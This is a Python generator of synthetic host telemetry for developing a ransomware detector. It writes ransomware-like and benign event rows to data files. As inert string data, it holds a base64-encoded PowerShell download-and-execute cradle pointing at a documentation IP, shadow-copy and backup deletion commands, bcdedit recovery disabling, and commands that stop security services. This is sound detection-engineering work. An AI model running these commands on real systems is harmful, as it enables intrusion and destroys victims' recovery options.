"""Synthetic endpoint telemetry generator.

Produces labelled host timelines with benign activity plus ransomware-LIKE
behaviour. Nothing here is malware: it only writes rows that *describe*
events (process names, command lines, file renames) so the detector can be
developed and evaluated safely. Command lines mirror behaviours documented in
public CISA/MITRE reporting (e.g. shadow-copy deletion) and are inert text.

Usage:  python scripts/generate_data.py --hosts 120 --seed 7 --out data/generated/train
"""
from __future__ import annotations

import base64
import random
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

import pandas as pd

RANSOMWARE_SCENARIOS = [
    "rw_full_chain",  # phishing -> recon -> privesc -> tamper -> backup deletion -> encryption
    "rw_fast_encryptor",  # minimal precursors, immediate encryption
    "rw_slow_encryptor",  # throttled encryption to evade rate thresholds
    "rw_inplace_no_rename",  # encrypts in place, no extension change, WMI shadow deletion
    "rw_precursor_only",  # caught before encryption (true early-warning case)
]
BENIGN_SCENARIOS = [
    "benign_office",
    "benign_backup_rotation",  # backup agent deleting one old snapshot (hard negative)
    "benign_photo_rename",  # bulk rename, same extension (hard negative)
    "benign_compression",  # 7-Zip creating high-entropy archive (hard negative)
    "benign_it_patching",  # admin stops services, uses privileges (hard negative)
    "benign_dev_build",  # build writes/renames hundreds of files (hard negative)
    "benign_mgmt_agent_ps",  # SCCM/Intune running encoded PowerShell as SYSTEM (hard negative)
]

DEPTS = ["FIN", "HR", "ENG", "SALES", "OPS", "LAB", "LEGAL", "IT"]
FIRST = ["alex", "sam", "jordan", "taylor", "casey", "morgan", "riley", "jamie", "avery", "quinn", "devon", "harper"]
LAST = ["lee", "patel", "nguyen", "smith", "garcia", "khan", "brown", "martin", "roy", "tremblay", "singh", "chen"]
DOC_EXT_LOW = ["txt", "csv", "log", "xml", "html", "sql", "json", "md"]  # normally low entropy
DOC_EXT_HIGH = ["docx", "xlsx", "pptx", "pdf", "jpg", "png"]  # already compressed formats
DIRS = ["Documents", "Documents\\Projects", "Documents\\Reports", "Desktop", "Pictures", "Downloads", "Documents\\Finance"]
OFFICE = ["winword.exe", "excel.exe", "outlook.exe", "powerpnt.exe"]
BENIGN_PROCS = ["chrome.exe", "msedge.exe", "teams.exe", "outlook.exe", "winword.exe", "excel.exe", "explorer.exe", "onedrive.exe", "acrord32.exe", "notepad.exe"]
NOTE_NAMES = ["README_RESTORE_FILES.txt", "HOW_TO_DECRYPT.html", "!!_RECOVER_YOUR_DATA_!!.txt", "UNLOCK_INSTRUCTIONS.txt", "RANSOM_NOTE_READ_ME.hta"]


def _rand_ext(rng: random.Random) -> str:
    return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(rng.randint(4, 6)))


def _b64ps(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


@dataclass
class HostSpec:
    host: str
    user: str
    scenario: str
    start: datetime
    duration_min: int
    variant: dict = field(default_factory=dict)


class TimelineBuilder:
    def __init__(self, spec: HostSpec, rng: random.Random):
        self.s = spec
        self.rng = rng
        self.rows: list[dict] = []
        self.encryption_start: datetime | None = None
        self.first_malicious: datetime | None = None

    # ---- primitive ----
    def add(self, t: datetime, event_type: str, phase: str = "benign", **kw):
        row = {
            "timestamp": t.isoformat(),
            "host": self.s.host,
            "user": kw.pop("user", self.s.user),
            "event_type": event_type,
            "event_id": kw.pop("event_id", 0),
            "process_name": kw.pop("process_name", ""),
            "parent_process": kw.pop("parent_process", ""),
            "command_line": kw.pop("command_line", ""),
            "file_path": kw.pop("file_path", ""),
            "old_extension": kw.pop("old_extension", ""),
            "new_extension": kw.pop("new_extension", ""),
            "entropy": round(kw.pop("entropy", 0.0), 3),
            "service_name": kw.pop("service_name", ""),
            "privilege": kw.pop("privilege", ""),
            "integrity_level": kw.pop("integrity_level", "Medium"),
            "phase": phase,
        }
        self.rows.append(row)
        if phase != "benign" and self.first_malicious is None:
            self.first_malicious = t

    def proc(self, t, name, parent="explorer.exe", cmd=None, phase="benign", **kw):
        self.add(t, "process_start", phase, event_id=1, process_name=name, parent_process=parent,
                 command_line=cmd if cmd is not None else f"\"C:\\Program Files\\{name}\"", **kw)

    def user_path(self, d=None, name=None, ext=None):
        d = d or self.rng.choice(DIRS)
        ext = ext or self.rng.choice(DOC_EXT_LOW + DOC_EXT_HIGH)
        name = name or f"{self.rng.choice(['report','budget','notes','invoice','draft','plan','data','minutes','scan'])}_{self.rng.randint(1, 999)}"
        return f"C:\\Users\\{self.s.user}\\{d}\\{name}.{ext}", ext

    # ---- background ----
    def background(self, density: float = 1.0):
        t = self.s.start
        end = self.s.start + timedelta(minutes=self.s.duration_min)
        self.add(t, "logon", event_id=4624, process_name="winlogon.exe")
        while t < end:
            t += timedelta(seconds=self.rng.expovariate(1 / (25 / density)))
            r = self.rng.random()
            if r < 0.25:
                self.proc(t, self.rng.choice(BENIGN_PROCS))
            elif r < 0.55:
                path, ext = self.user_path()
                ent = self.rng.uniform(3.5, 5.6) if ext in DOC_EXT_LOW else self.rng.uniform(7.0, 7.72)
                self.add(t, "file_write", event_id=11, process_name=self.rng.choice(OFFICE + ["notepad.exe"]),
                         file_path=path, new_extension=ext, entropy=ent)
            elif r < 0.65:
                path, ext = self.user_path()
                self.add(t, "file_create", event_id=11, process_name="explorer.exe", file_path=path, new_extension=ext)
            elif r < 0.85:
                self.add(t, "network_connection", event_id=3, process_name=self.rng.choice(["chrome.exe", "teams.exe", "outlook.exe"]))
            elif r < 0.90:
                path, ext = self.user_path()
                np, _ = self.user_path(ext=ext)
                self.add(t, "file_rename", event_id=11, process_name="explorer.exe", file_path=np, old_extension=ext, new_extension=ext)
            elif r < 0.95:
                self.add(t, "privilege_use", event_id=4672, user="SYSTEM", process_name="svchost.exe",
                         privilege=self.rng.choice(["SeTcbPrivilege", "SeAssignPrimaryTokenPrivilege"]), integrity_level="System")
            elif r < 0.975:
                self.add(t, "service_stop", event_id=7036, user="SYSTEM", process_name="services.exe",
                         service_name=self.rng.choice(["VSS", "BITS", "wuauserv", "TrustedInstaller", "DoSvc"]))  # idle stops are normal
            else:
                path, ext = self.user_path()
                self.add(t, "file_delete", event_id=23, process_name="explorer.exe", file_path=path, new_extension=ext)

    # ---- gray (benign but suspicious-looking) activity for realistic false positives ----
    def gray_noise(self, t, kinds: list[str]):
        u = self.s.user
        for k in kinds:
            t += timedelta(minutes=self.rng.randint(3, 30))
            if k == "helpdesk_recon":  # support technician troubleshooting
                for c in self.rng.sample(["whoami /all", "ipconfig /all", "systeminfo", "net share", "arp -a"], self.rng.randint(3, 4)):
                    t += timedelta(seconds=self.rng.randint(10, 90))
                    self.proc(t, "cmd.exe", parent="explorer.exe", cmd=f"cmd.exe /c {c}")
            elif k == "installer_from_temp":  # user-approved installer elevated via UAC
                exe = f"setup_{self.rng.randint(100, 999)}.exe"
                self.proc(t, exe, parent="msedge.exe", cmd=f"\"C:\\Users\\{u}\\AppData\\Local\\Temp\\{exe}\" /S", integrity_level="High")
                self.add(t + timedelta(seconds=5), "privilege_use", event_id=4673, process_name=exe, privilege="SeLoadDriverPrivilege",
                         integrity_level="High")
            elif k == "user_encoded_ps":  # power-user script using -enc
                self.proc(t, "powershell.exe", parent="explorer.exe",
                          cmd=f"powershell.exe -ExecutionPolicy Bypass -enc {_b64ps('Get-ChildItem $env:USERPROFILE -Recurse | Measure-Object')}")
            elif k == "dba_maintenance":  # DBA restarts SQL writer outside change window
                self.proc(t, "sc.exe", parent="cmd.exe", cmd="sc stop \"SQLWriter\"", integrity_level="High")
                if self.rng.random() < 0.5:
                    self.proc(t + timedelta(seconds=20), "net.exe", parent="cmd.exe", cmd="net stop \"MSSQLSERVER\"", integrity_level="High")
            elif k == "cloud_sync_conflict":  # sync client renaming conflicted copies to an odd extension
                for i in range(self.rng.randint(8, 40)):
                    p, ext = self.user_path(d="Documents")
                    self.add(t + timedelta(seconds=i * self.rng.uniform(0.5, 3)), "file_rename", event_id=11, process_name="SyncClient.exe",
                             file_path=f"{p}.sync-conflict", old_extension=ext, new_extension="sync-conflict")
            elif k == "encrypted_container":  # user saving files into an encryption tool vault (high entropy)
                for i in range(self.rng.randint(6, 25)):
                    p, ext = self.user_path(d="Documents\\Vault")
                    self.add(t + timedelta(seconds=i * 3), "file_write", event_id=11, process_name="VaultApp.exe", file_path=p,
                             new_extension=ext, entropy=self.rng.uniform(7.9, 7.99))
        return t

    # ---- ransomware-like building blocks (inert descriptions only) ----
    def initial_access(self, t):
        office = self.rng.choice(OFFICE)
        payload = _b64ps("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')")  # TEST-NET doc range
        self.proc(t, office, phase="initial_access")
        self.proc(t + timedelta(seconds=40), "powershell.exe", parent=office,
                  cmd=f"powershell.exe -nop -w hidden -enc {payload}", phase="initial_access")
        drop = f"C:\\Users\\{self.s.user}\\AppData\\Local\\Temp\\{self.rng.choice(['svc_update','winhlp','msupd','chk'])}{self.rng.randint(10,99)}.exe"
        self.proc(t + timedelta(seconds=75), drop.split("\\")[-1], parent="powershell.exe", cmd=f"\"{drop}\"", phase="initial_access")
        self.add(t + timedelta(seconds=80), "network_connection", "initial_access", event_id=3, process_name=drop.split("\\")[-1])
        return drop.split("\\")[-1], t + timedelta(seconds=90)

    def discovery(self, t, parent):
        cmds = ["whoami /all", "net view /all", "nltest /domain_trusts", "net group \"domain admins\" /domain", "ipconfig /all", "systeminfo", "net share", "arp -a"]
        for c in self.rng.sample(cmds, self.rng.randint(3, 6)):
            t += timedelta(seconds=self.rng.randint(15, 120))
            self.proc(t, "cmd.exe", parent=parent, cmd=f"cmd.exe /c {c}", phase="discovery")
        return t

    def privesc(self, t, proc):
        for priv in self.rng.sample(["SeDebugPrivilege", "SeTakeOwnershipPrivilege", "SeImpersonatePrivilege", "SeLoadDriverPrivilege"], self.rng.randint(1, 3)):
            t += timedelta(seconds=self.rng.randint(20, 200))
            self.add(t, "privilege_use", "privilege_escalation", event_id=4673, process_name=proc, privilege=priv, integrity_level="High")
        t += timedelta(seconds=30)
        self.proc(t, proc, parent="services.exe", cmd=f"\"C:\\Users\\{self.s.user}\\AppData\\Local\\Temp\\{proc}\" --elevated",
                  phase="privilege_escalation", integrity_level="System")
        return t

    def tamper(self, t, proc, n=None):
        targets = ["WinDefend", "Sense", "VeeamBackupSvc", "SQLWriter", "MSSQLSERVER", "wbengine", "SDRSVC", "MSExchangeIS", "SophosAgent"]
        for svc in self.rng.sample(targets, n or self.rng.randint(2, 5)):
            t += timedelta(seconds=self.rng.randint(3, 25))
            verb = self.rng.choice(["net stop", "sc stop", "sc config"])
            cmd = f"{verb} \"{svc}\"" + (" start= disabled" if verb == "sc config" else "")
            self.proc(t, verb.split()[0] + ".exe", parent=proc, cmd=cmd, phase="defense_evasion", integrity_level="System")
            self.add(t + timedelta(seconds=1), "service_stop", "defense_evasion", event_id=7036, user="SYSTEM",
                     process_name="services.exe", service_name=svc)
        return t

    def inhibit_recovery(self, t, proc, style="vssadmin", bcd=True):
        cmds = {
            "vssadmin": [("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")],
            "wmic": [("wmic.exe", "wmic.exe shadowcopy delete /nointeractive")],
            "powershell": [("powershell.exe", "powershell.exe -c \"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\"")],
        }[style]
        if self.rng.random() < 0.6:
            cmds = cmds + [("wbadmin.exe", "wbadmin.exe delete catalog -quiet")]
        if bcd:
            cmds += [("bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled no"),
                     ("bcdedit.exe", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures")]
        for name, cmd in cmds:
            t += timedelta(seconds=self.rng.randint(2, 20))
            self.proc(t, name, parent=proc, cmd=cmd, phase="inhibit_recovery", integrity_level="System")
        return t

    def encrypt(self, t, proc, n_files, per_min, rename=True, notes=True):
        self.encryption_start = t
        ext = _rand_ext(self.rng)
        dirs_done = set()
        note = self.rng.choice(NOTE_NAMES)
        gap = 60.0 / per_min
        for _ in range(n_files):
            t += timedelta(seconds=max(0.05, self.rng.gauss(gap, gap * 0.3)))
            d = self.rng.choice(DIRS)
            path, old = self.user_path(d=d)
            self.add(t, "file_write", "impact", event_id=11, process_name=proc, file_path=path, new_extension=old,
                     entropy=self.rng.uniform(7.92, 7.999), integrity_level="System")
            if rename:
                self.add(t + timedelta(milliseconds=30), "file_rename", "impact", event_id=11, process_name=proc,
                         file_path=f"{path}.{ext}", old_extension=old, new_extension=ext, integrity_level="System")
            if notes and d not in dirs_done:
                dirs_done.add(d)
                self.add(t + timedelta(milliseconds=60), "file_create", "impact", event_id=11, process_name=proc,
                         file_path=f"C:\\Users\\{self.s.user}\\{d}\\{note}", new_extension=note.rsplit('.', 1)[-1],
                         integrity_level="System")
        return t


def build_host(spec: HostSpec, rng: random.Random) -> tuple[list[dict], dict]:
    b = TimelineBuilder(spec, rng)
    sc, v = spec.scenario, spec.variant
    b.background(density=v.get("density", 1.0))
    t0 = spec.start + timedelta(minutes=rng.randint(20, max(21, spec.duration_min // 2)))

    if sc == "rw_full_chain":
        proc, t = b.initial_access(t0)
        t = b.discovery(t + timedelta(minutes=rng.randint(2, 10)), proc)
        t = b.privesc(t + timedelta(minutes=rng.randint(3, 12)), proc)
        t = b.tamper(t + timedelta(minutes=rng.randint(2, 8)), proc)
        t = b.inhibit_recovery(t + timedelta(minutes=rng.randint(1, 5)), proc, style=rng.choice(["vssadmin", "wmic"]))
        b.encrypt(t + timedelta(minutes=rng.randint(1, 6)), proc, rng.randint(250, 600), rng.randint(40, 120))
    elif sc == "rw_fast_encryptor":
        proc = f"{rng.choice(['upd','tmp','x'])}{rng.randint(100,999)}.exe"
        b.proc(t0, proc, parent="explorer.exe", cmd=f"\"C:\\Users\\Public\\{proc}\"", phase="execution")
        t = b.inhibit_recovery(t0 + timedelta(seconds=20), proc, style="vssadmin", bcd=rng.random() < 0.5)
        b.encrypt(t + timedelta(seconds=rng.randint(5, 40)), proc, rng.randint(300, 800), rng.randint(150, 400))
    elif sc == "rw_slow_encryptor":
        if v.get("stealth_exec"):  # e.g. hands-on-keyboard via valid RDP creds; binary in an unusual non-temp folder
            proc = f"perf{rng.randint(10, 99)}.exe"
            b.proc(t0, proc, parent="explorer.exe", cmd=f"\"C:\\PerfLogs\\{proc}\"", phase="execution")
            t = t0 + timedelta(seconds=30)
        else:
            proc, t = b.initial_access(t0)
        if v.get("precursors", True):
            t = b.tamper(t + timedelta(minutes=rng.randint(5, 15)), proc, n=rng.randint(1, 2))
            if v.get("delete_backups", True):
                t = b.inhibit_recovery(t + timedelta(minutes=2), proc, style="powershell", bcd=False)
        b.encrypt(t + timedelta(minutes=rng.randint(2, 8)), proc, rng.randint(60, 140), v.get("per_min", rng.uniform(1.5, 4)),
                  notes=v.get("notes", True))
    elif sc == "rw_inplace_no_rename":
        proc, t = b.initial_access(t0)
        t = b.privesc(t + timedelta(minutes=rng.randint(3, 10)), proc)
        if v.get("delete_backups", True):
            t = b.inhibit_recovery(t + timedelta(minutes=rng.randint(1, 4)), proc, style=rng.choice(["wmic", "powershell"]), bcd=rng.random() < 0.5)
        b.encrypt(t + timedelta(minutes=rng.randint(1, 4)), proc, rng.randint(150, 400), rng.randint(20, 80), rename=False,
                  notes=v.get("notes", rng.random() < 0.5))
    elif sc == "rw_precursor_only":
        proc, t = b.initial_access(t0)
        t = b.discovery(t + timedelta(minutes=rng.randint(2, 10)), proc)
        t = b.privesc(t + timedelta(minutes=rng.randint(2, 10)), proc)
        t = b.tamper(t + timedelta(minutes=rng.randint(2, 8)), proc)
        if v.get("delete_backups", True):
            b.inhibit_recovery(t + timedelta(minutes=rng.randint(1, 5)), proc, style=rng.choice(["vssadmin", "wmic", "powershell"]))
    elif sc == "benign_backup_rotation":
        t = t0
        for _ in range(rng.randint(1, 3)):
            b.proc(t, "vssadmin.exe", parent="BackupAgent.exe", user="SYSTEM", integrity_level="System",
                   cmd="vssadmin.exe create shadow /for=C:")
            b.proc(t + timedelta(seconds=30), "vssadmin.exe", parent="BackupAgent.exe", user="SYSTEM", integrity_level="System",
                   cmd=f"vssadmin.exe delete shadows /shadow={{{uuid.UUID(int=rng.getrandbits(128))}}} /quiet")
            b.add(t + timedelta(seconds=60), "service_stop", event_id=7036, user="SYSTEM", process_name="services.exe", service_name="VSS")
            t += timedelta(minutes=rng.randint(20, 40))
    elif sc == "benign_photo_rename":
        t = t0
        for i in range(rng.randint(150, 450)):
            t += timedelta(seconds=rng.uniform(0.2, 1.2))
            b.add(t, "file_rename", event_id=11, process_name=rng.choice(["explorer.exe", "PhotoRenamer.exe"]),
                  file_path=f"C:\\Users\\{spec.user}\\Pictures\\Trip_{i:04d}.jpg", old_extension="jpg", new_extension="jpg")
    elif sc == "benign_compression":
        b.proc(t0, "7zG.exe", parent="explorer.exe", cmd=f"\"C:\\Program Files\\7-Zip\\7zG.exe\" a Archive_{rng.randint(1,99)}.7z")
        for i in range(rng.randint(40, 120)):
            b.add(t0 + timedelta(seconds=2 * i), "file_write", event_id=11, process_name="7zG.exe",
                  file_path=f"C:\\Users\\{spec.user}\\Documents\\Archive_{i // 40}.7z", new_extension=rng.choice(["7z", "zip"]), entropy=rng.uniform(7.95, 7.999))
        if rng.random() < 0.5:
            for i in range(rng.randint(30, 150)):
                path, ext = b.user_path(d="Documents\\Projects")
                b.add(t0 + timedelta(seconds=300 + i), "file_delete", event_id=23, process_name="explorer.exe", file_path=path, new_extension=ext)
    elif sc == "benign_it_patching":
        admin = "it-admin"
        b.add(t0, "logon", event_id=4624, user=admin, process_name="winlogon.exe")
        b.add(t0 + timedelta(seconds=10), "privilege_use", event_id=4672, user=admin, process_name="mmc.exe",
              privilege=rng.choice(["SeBackupPrivilege", "SeSecurityPrivilege"]), integrity_level="High")
        for i, svc in enumerate(rng.sample(["wuauserv", "Spooler", "BITS", "W3SVC", "TermService"], 3)):
            b.proc(t0 + timedelta(minutes=1 + i), "net.exe", parent="cmd.exe", user=admin, cmd=f"net stop {svc}", integrity_level="High")
            b.add(t0 + timedelta(minutes=1 + i, seconds=2), "service_stop", event_id=7036, user="SYSTEM", process_name="services.exe", service_name=svc)
        b.proc(t0 + timedelta(minutes=5), "msiexec.exe", parent="cmd.exe", user=admin, cmd="msiexec /i KB5031234.msi /qn", integrity_level="High")
        b.proc(t0 + timedelta(minutes=8), "powershell.exe", parent="cmd.exe", user=admin, cmd="powershell.exe -File C:\\IT\\post_patch_check.ps1", integrity_level="High")
        b.proc(t0 + timedelta(minutes=9), "bcdedit.exe", parent="cmd.exe", user=admin, cmd="bcdedit /enum", integrity_level="High")
    elif sc == "benign_dev_build":
        b.proc(t0, "msbuild.exe", parent="devenv.exe", cmd="msbuild.exe Solution.sln /t:Rebuild")
        for i in range(rng.randint(200, 600)):
            t = t0 + timedelta(seconds=0.3 * i)
            p = f"C:\\Users\\{spec.user}\\source\\repos\\App\\obj\\file{i}"
            b.add(t, "file_write", event_id=11, process_name="msbuild.exe", file_path=p + ".tmp", new_extension="tmp", entropy=rng.uniform(5.0, 6.6))
            if i % 3 == 0:
                b.add(t + timedelta(milliseconds=50), "file_rename", event_id=11, process_name="msbuild.exe",
                      file_path=p + rng.choice([".dll", ".pdb", ".exe", ".obj"]), old_extension="tmp", new_extension=rng.choice(["dll", "pdb", "obj"]))
        b.add(t0 + timedelta(seconds=5), "file_create", event_id=11, process_name="msbuild.exe",
              file_path=f"C:\\Users\\{spec.user}\\source\\repos\\App\\README.md", new_extension="md")
    elif sc == "benign_mgmt_agent_ps":
        for i in range(rng.randint(2, 6)):
            b.proc(t0 + timedelta(minutes=10 * i), "powershell.exe", parent=rng.choice(["CcmExec.exe", "IntuneManagementExtension.exe"]),
                   user="SYSTEM", integrity_level="System",
                   cmd=f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {_b64ps('Get-CimInstance Win32_OperatingSystem | Select Version')}")
    # benign_office: background only
    if not sc.startswith("rw_") and v.get("gray"):
        b.gray_noise(spec.start + timedelta(minutes=10), v["gray"].split("+"))

    rows = b.rows
    label = {
        "host": spec.host,
        "scenario": sc,
        "is_ransomware": int(sc.startswith("rw_")),
        "first_malicious_ts": b.first_malicious.isoformat() if b.first_malicious else "",
        "encryption_start_ts": b.encryption_start.isoformat() if b.encryption_start else "",
        "user": spec.user,
        "variant": ";".join(f"{k}={v}" for k, v in spec.variant.items()),
    }
    return rows, label


GRAY_KINDS = ["helpdesk_recon", "installer_from_temp", "user_encoded_ps", "dba_maintenance", "cloud_sync_conflict", "encrypted_container"]


def generate_dataset(n_hosts: int = 120, seed: int = 7, ransomware_ratio: float = 0.4,
                     hard_mode: bool = False, gray_ratio: float | None = None) -> tuple[pd.DataFrame, pd.DataFrame]:
    """Generate (events, labels).

    gray_ratio: share of benign hosts that also get benign-but-suspicious activity.
    hard_mode: adds evasive ransomware variants (used for the held-out test set).
    """
    gray_ratio = (0.45 if hard_mode else 0.25) if gray_ratio is None else gray_ratio
    rng = random.Random(seed)
    base = datetime(2026, 10, 5, 13, 0, tzinfo=timezone.utc)
    all_rows, labels, used = [], [], set()
    n_rw = round(n_hosts * ransomware_ratio)
    scenarios = [RANSOMWARE_SCENARIOS[i % len(RANSOMWARE_SCENARIOS)] for i in range(n_rw)]
    scenarios += [BENIGN_SCENARIOS[i % len(BENIGN_SCENARIOS)] for i in range(n_hosts - n_rw)]
    rng.shuffle(scenarios)
    for sc in scenarios:
        while True:
            host = f"WS-{rng.choice(DEPTS)}-{rng.randint(1, 250):03d}"
            if host not in used:
                used.add(host)
                break
        user = f"{rng.choice(FIRST)}.{rng.choice(LAST)}"
        variant: dict = {}
        if not sc.startswith("rw_") and rng.random() < gray_ratio:
            variant["gray"] = "+".join(rng.sample(GRAY_KINDS, rng.choice([1, 1, 2, 3])))
        if hard_mode:
            if sc == "rw_slow_encryptor":
                variant = {"per_min": round(rng.uniform(0.6, 2.0), 2), "notes": rng.random() < 0.5,
                           "precursors": rng.random() < 0.6, "delete_backups": rng.random() < 0.5,
                           "stealth_exec": rng.random() < 0.5}
            elif sc == "rw_inplace_no_rename":
                variant = {"notes": False, "delete_backups": rng.random() < 0.5}
            elif sc == "rw_precursor_only":
                variant = {"delete_backups": rng.random() < 0.5}
            variant["density"] = round(rng.uniform(0.6, 1.8), 2)
        spec = HostSpec(host, user, sc, base + timedelta(minutes=rng.randint(0, 600)), rng.randint(120, 240), variant)
        rows, label = build_host(spec, rng)
        all_rows.extend(rows)
        labels.append(label)
    events = pd.DataFrame(all_rows).sort_values(["host", "timestamp"]).reset_index(drop=True)
    return events, pd.DataFrame(labels)
